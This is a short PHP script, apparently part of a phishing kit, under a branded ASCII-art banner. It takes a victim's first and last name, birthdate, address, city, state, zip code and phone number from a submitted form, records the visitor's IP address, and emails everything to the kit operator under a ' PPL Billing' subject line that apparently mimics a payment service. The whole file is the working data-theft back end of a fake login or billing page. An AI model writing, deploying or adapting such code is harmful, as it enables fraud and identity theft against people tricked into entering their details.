<?php
//#     #            #     #                                                              #     #   #   
//##   ## #####      #     # #    # #####  ###### ##### ######  ####  ##### ###### #####  #     #  ##   
//# # # # #    #     #     # ##   # #    # #        #   #      #    #   #   #      #    # #     # # #   
//#  #  # #    #     #     # # #  # #    # #####    #   #####  #        #   #####  #    # #     #   #   
//#     # #####  ### #     # #  # # #    # #        #   #      #        #   #      #    #  #   #    #   
//#     # #   #  ### #     # #   ## #    # #        #   #      #    #   #   #      #    #   # #     #   
//#     # #    # ###  #####  #    # #####  ######   #   ######  ####    #   ###### #####     #    ##### 
include 'function.php';
include '../../email.php';
include("system.php");

$_SESSION['First_Name']     = $_POST['Firstname'];
$_SESSION['Last_Name']      = $_POST['LastName'];
$_SESSION['Birthdate']     = $_POST['birthdate'];
$_SESSION['Address']        = $_POST['addres'];
$_SESSION['City']          = $_POST['City'];
$_SESSION['State']         = $_POST['State'];
$_SESSION['Zip_code']        = $_POST['zipCod'];
$_SESSION['Phone_Number']   = $_POST['phoneNumber'];

$ip=$_SESSION['ip']=getip();
$subject=$_SESSION['subject']=" PPL Billing | ".$ip."" . "\r\n";
send($_SESSION,$to,$subject) ; 

?>